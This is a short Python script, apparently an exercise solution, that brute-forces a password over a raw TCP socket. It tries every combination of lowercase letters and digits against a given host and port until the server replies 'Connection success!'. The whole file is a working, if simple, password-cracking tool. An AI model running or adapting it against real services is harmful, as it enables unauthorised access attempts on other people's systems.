import argparse
from socket import socket
from itertools import product


class Socket:
    def __init__(self, host, port):
        self.host = host
        self.port = int(port)

    def brute_pass(self):
        with socket() as sock:
            sock.connect((self.host, self.port))
            for password in generate_password():
                msg = ''.join(map(str, password)).encode()
                sock.send(msg)
                resp = sock.recv(1024).decode()
                if resp == 'Connection success!':
                    print(msg.decode())
                    break


def generate_password():
    index = 1
    while True:
        abc = 'abcdefghijklmnopqrstuvwxyz1234567890'
        yield from product(abc, repeat=index)
        index += 1


def main():
    parse_args = argparse.ArgumentParser()
    parse_args.add_argument('address')
    parse_args.add_argument('port')
    args = parse_args.parse_args()

    Socket(args.address, args.port).brute_pass()


if __name__ == '__main__':
    main()
